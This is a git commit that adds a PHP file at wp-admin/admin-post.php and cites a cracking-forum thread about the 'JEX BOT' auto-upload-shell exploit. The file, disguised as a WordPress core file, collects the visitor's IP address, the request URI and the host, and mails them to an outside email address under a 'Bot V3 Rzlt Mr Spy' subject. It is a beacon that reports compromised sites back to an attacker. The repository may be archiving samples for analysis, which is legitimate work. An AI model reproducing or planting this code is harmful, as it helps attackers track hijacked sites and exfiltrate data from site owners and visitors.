5d33f1ed7e328a1b226b4a480702fc4f44a43a46
Stefan Pejcic <pejcha1994@gmail.com>
2021-01-14 10:44:09 +0100

    JEX BOT - BOT EXPLOIT - PRIV8 AUTO UPLOAD SHELL
    https://cracked.to/Thread-FREE-JEx-Bot-BOT-Exploit-Priv8-Auto-Upload-Shell-AUTO-EXPLOIT-2020?page=6

---
+++ 14.01.2021/wp-admin/admin-post.php
@@ -0,0 +1,12 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " Bot V3 Rzlt Mr Spy |$ra44";
+$email = "achach0044@yahoo.com";
+$from = "From: Result<botv3@mrspybotv3.com";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
+?>
